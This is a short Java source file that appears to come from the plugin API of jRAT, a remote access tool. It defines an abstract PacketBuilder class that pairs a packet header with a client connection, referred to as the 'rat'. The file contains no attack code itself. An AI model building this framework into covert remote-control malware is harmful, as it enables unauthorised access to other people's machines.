package jrat.api.net;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.Client;

public abstract class PacketBuilder {

	private short header;
	private Client rat;

	public PacketBuilder(short header, Client rat) {
		this.header = header;
		this.rat = rat;
	}

	/**
	 * Abstract write method, called when ready to write
	 * 
	 * @param dos
	 * @param dis
	 * @throws Exception
	 */
	public abstract void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception;

	/**
	 * 
	 * @return The header of this packet
	 */
	public short getHeader() {
		return header;
	}

	/**
	 * 
	 * @return The rat object to write this packet to
	 */
	public Client getClient() {
		return rat;
	}

}
